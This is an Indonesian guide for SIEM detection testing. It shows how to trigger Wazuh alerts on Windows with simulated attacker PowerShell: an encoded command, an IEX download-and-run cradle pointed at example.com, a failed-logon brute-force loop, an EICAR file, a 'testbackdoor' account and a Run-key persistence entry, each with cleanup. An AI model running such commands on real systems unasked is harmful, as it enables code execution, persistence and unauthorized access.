# Panduan: Trigger Threat di Wazuh via PowerShell (Windows)

> Untuk pengujian setelah workshop — TIDAK termasuk materi presentasi.
> Semua perintah dijalankan di PowerShell **sebagai Administrator** pada mesin yang
> sudah terinstall Wazuh Agent dan terhubung ke manager.

---

## Persiapan

```powershell
# 1. Pastikan agent jalan & terhubung
Get-Service -Name "WazuhSvc"

# 2. Pastikan log audit PowerShell aktif (Script Block Logging)
# Cek via Group Policy atau registry:
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue

# Kalau kosong, aktifkan:
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1

# 3. Catat waktu mulai test (untuk filter di dashboard)
Get-Date -Format "yyyy-MM-dd HH:mm:ss"
```

---

## Test 1: PowerShell Suspicious Command (rule 92032 serangan PowerShell)

```powershell
# Simulasi encoded command — pola yang sering dipakai attacker
powershell -EncodedCommand "dwByAGkAdABlAC0AaABvAHMAdAAgAHQAZQBzAHQA"

# Download cradle pattern (amankan: gunakan example.com)
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.txt')"
```

**Cek di Wazuh Dashboard (Discover):**
```
rule.groups:(powershell) and data.win.eventdata.commandLine:*IEX*
```

---

## Test 2: Multiple Failed Logon (Brute Force — rule 5710/5712)

```powershell
# Simulasi brute force ke local account (5x gagal)
$target = "localhost"
1..5 | ForEach-Object {
    $sec = ConvertTo-SecureString "WrongPass$_" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("testuser$_", $sec)
    try {
        Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock { whoami } -ErrorAction Stop
    } catch {
        Write-Host "Attempt $_ failed (expected)"
    }
}
```

**Cek di Dashboard:**
```
rule.groups:authentication_failed and data.win.eventdata.ipAddress:*
```

Atau cek log Windows dulu:
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 5
```

---

## Test 3: File Creation di Folder Terpantau (FIM — rule 554)

```powershell
# Pastikan FIM memantau folder ini (cek ossec.conf)
# Simulasi attacker drop file mencurigakan
New-Item -Path "C:\Users\Public\test_eicar.txt" -ItemType File -Force
Set-Content -Path "C:\Users\Public\test_eicar.txt" -Value "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# Modifikasi file sistem yang dipantau (hosts file — backup dulu!)
Copy-Item "C:\Windows\System32\drivers\etc\hosts" "C:\hosts.backup"
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "# FIM test entry"

# Cleanup setelah test
Remove-Item "C:\Users\Public\test_eicar.txt" -Force
Copy-Item "C:\hosts.backup" "C:\Windows\System32\drivers\etc\hosts" -Force
Remove-Item "C:\hosts.backup" -Force
```

**Cek di Dashboard:**
```
rule.groups:syscheck and syscheck.path:*Public*
rule.groups:syscheck and syscheck.path:*hosts*
```

---

## Test 4: New User Creation (rule 5760+ — Account Manipulation)

```powershell
# Buat user test (indikasi attacker backdoor)
New-LocalUser -Name "testbackdoor" -Password (ConvertTo-SecureString "Test1234!" -AsPlainText -Force) -Description "FIM test"

# Hapus setelah test
Remove-LocalUser -Name "testbackdoor"
```

**Cek di Dashboard:**
```
rule.groups:windows and data.win.eventdata.targetUserName:testbackdoor
```

---

## Test 5: Registry Persistence (rule 262/263)

```powershell
# Simulasi attacker menambah persistence di registry Run key
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "TestPersistence" -Value "C:\Windows\System32\notepad.exe" -PropertyType String -Force

# Cleanup
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestPersistence"
```

**Cek di Dashboard:**
```
rule.groups:syscheck and syscheck.path:*CurrentVersion*Run*
```

---

## Verifikasi: Alert Masuk ke Wazuh

```powershell
# 1. Tunggu 10-30 detik (agent kirim log real-time)
# 2. Cek log agent lokal (pastikan terkirim)
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 20

# 3. Test koneksi ke manager
& "C:\Program Files (x86)\ossec-agent\agent-auth.exe" -A  # (hanya jika perlu re-register)
```

Di Wazuh Dashboard:
1. Buka **Discover / Threat Hunting**
2. Set time range ke "Last 15 minutes"
3. Filter: `agent.name: nama-laptop-kamu`
4. Sort by timestamp descending

---

## Troubleshooting

| Masalah | Solusi |
|---------|--------|
| Alert tidak muncul | Cek `ossec.log` untuk error koneksi |
| PowerShell rule tidak picu | Pastikan Script Block Logging aktif (langkah Persiapan) |
| FIM tidak deteksi | Cek config `<directories>` di ossec.conf mencakup path yang diuji |
| Level alert rendah | Beberapa rule butuh frequency — ulangi test lebih banyak kali |

---

## Catatan Keamanan

- Semua test di atas **aman** dan direkomendasikan Microsoft untuk testing SIEM
- Jangan jalankan di production tanpa koordinasi dengan tim
- Cleanup selalu dilakukan setelah test (lihat tiap section)
